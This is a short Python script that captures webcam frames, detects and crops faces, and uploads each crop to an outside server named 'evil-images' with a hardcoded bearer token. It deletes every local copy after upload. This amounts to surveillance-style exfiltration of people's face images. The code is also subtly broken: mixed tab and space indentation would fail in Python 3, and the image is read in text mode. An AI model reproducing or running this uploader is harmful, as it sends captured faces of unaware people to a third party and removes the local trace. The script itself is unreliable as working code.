import cv2, random, string, time, os, requests, math

api = "http://evil-images.azurewebsites.net/image"
delay = 60 # Capture every X frame
expand = 50
imagePath = "./out/"
cascPath = "./haarcascades/haarcascade_frontalface_default.xml"
faceCascade = cv2.CascadeClassifier(cascPath)

def generate_filename():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

def get_headers():
    return {
        'Authorization': 'Bearer totallyevilstuff'
    }

def post(path):
    img = open(path).read()
    os.remove(path)
    print(requests.post(url=api, data=img, headers=get_headers()))


#capture from camera at location 1 (try 0 if you only have one cam)

cap = cv2.VideoCapture(0)

#set the width and height, and UNSUCCESSFULLY set the exposure time
#cap.set(3,1280)
#cap.set(4,1024)
#cap.set(15, 0.1)

frameCounter = 0

while True:
    ret, img = cap.read()
    frameCounter = frameCounter + 1
    if (frameCounter % delay != 0):
	continue

    # find faces
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    faces = faceCascade.detectMultiScale(
        gray,
        scaleFactor=1.1,
        minNeighbors=5,
        minSize=(30, 30),
        #flags=cv2.CV_HAAR_SCALE_IMAGE
    )

    # Draw a rectangle around detected faces
    for (x, y, w, h) in faces:
        cv2.rectangle(img, (x-expand, y-expand), (x+w+expand, y+h+expand), (0, 255, 0), 2)

	result = img[y-expand-10:y+h+expand+10, x-expand-10:x+w+expand+10]

	filename = imagePath + generate_filename() + ".jpg"
	cv2.imwrite(filename, result)
        post(filename)

    cv2.imshow("input", img)

    key = cv2.waitKey(10)
    if key == 27:
        break


cv2.destroyAllWindows() 
cv2.VideoCapture(0).release()
